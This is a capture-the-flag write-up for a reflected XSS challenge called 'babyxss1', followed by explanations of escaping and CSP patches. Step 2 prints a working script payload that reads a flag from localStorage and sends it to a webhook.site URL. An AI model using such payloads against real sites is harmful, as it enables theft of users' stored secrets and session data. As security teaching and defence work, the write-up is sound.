# babyxss1 — Writeup

## 1. Where the vulnerability exists and why it happens

The bug is in the `GET /` route in `app.js`. When you search, the app takes your `?q=` text and drops it stright into the page's HTML:

```js
const searchQuery = req.query.q;
... <p>No results found for: ${searchQuery}</p>...
```

It never cleans or escapes the text first. So if you send `<script> ... </script>` as the query, the browser treats it as a real script tag and runs it. That's a reflected XSS. There's also no Content-Security-Policy anywhere, so nothing stops the script from running. 

However, the secret isn't in a cookie here. The admin bot (`bot.js`) saves the flag in the browser's `localStorage`, which can only be read by code running on the site's own address. That's why the attack has to run through the site's own search box, not from some other page. 

## How I exploited it and got the flag
1. I set up a free request-logging page at websitehook.site to catch stolen data. 
2. I built a link to the site with this payload in the search box, which reads the flag from `localStorage` and sends it to my webhook:

        http://babyxss1.136-83-2-1.sslip.io/?q=<script>fetch(`https://webhook.site/<id>/?f=${localStorage.getItem('flag')}`)</script>
3. I pasted that link into the "Resume URL" box and submitted the form. This makes the admin bot visit the link. 
4. The bot ran my script, and the flag showed up in my webhook as a request: `?f=flag{cr0ss_s1t3_scr1pt1n9_1s_fun_:D_89450394DASD}`.

## How the code patch works (`vuln.patch`)
I added a small `escapeHTML()` function and ran the search text through it before putting it in the page. It swaps dangerous characters like `<` and `>` for their harmless "entity" version (`&lt;` and `:&gt;`). After that, a `<script>` the attacker sends just shows up as plain text on the page instead of running. Normal searches like "developer" still work fine because they have not special characters. 

## How the CSP 2.0 patch works (`csp2.patch`)
I added a response header that tells the browser what it's allowed to run:
    
    script-src 'self' (no 'unsafe-inline', no ;unsafe-eval')

This means the browser will only run scripts that come from the site as seperate files. It will refuse any `<script>` typed directly into the page. So the injected script never runs. I also added `connect-src 'self'` as backup, which would bloack the data from being sent out even if a script did somehow run. 

This app has no inline scripts of its owen (the page only loads CSS files, no scripts), so there was nothing to move into external files. The policy blocks the attack without breaking anything. 

## How the CSP 3.0 patch works (`csp3.patch`)
This version uses a "nonce" (a random password the server makes fresh for every page load and puts in the header). The browser only runs a `<script>` if it carries that same random value. Since the attacker shouldn't be able to guess the random value, their injected script would be blocked. If the sire ever needed its own inline script, it would just tag it with the nonce and run it normally. I also added `'strict-dynamic'`, which is the modern recommended setting to go with nonces. 